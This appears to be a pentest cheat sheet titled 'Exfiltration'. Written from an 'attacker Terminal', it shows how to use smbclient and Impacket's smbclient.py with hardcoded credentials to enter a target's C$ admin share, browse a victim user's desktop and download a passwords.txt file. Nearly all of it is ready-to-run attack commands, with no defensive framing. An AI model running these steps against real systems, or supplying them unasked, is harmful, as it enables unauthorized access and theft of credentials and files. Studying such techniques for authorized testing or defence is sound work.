# Exfiltration

## smbclient
```bash
# attacker Terminal 1:
mkdir loot               # make a dir for loot
cd loot                  # change to loot dir
smbclient //192.168.1.69/c$ -U john Password123! # login
cd users\victor\desktop  # its case insensitive
dir                      # list files to exfil
mget passwords.txt       # download a file
exit
```

## Impacket
### smbclient.py
`smbclient.py` also connects to SMB ports on the target. 
```bash
# attacker Terminal 1:
# use this syntax to specify a domain account: "domain/username"
smbclient.py evilcorp/john@target # invoke a semi-interactive shell
use restrictedfolder 
get passwords.txt
exit
```
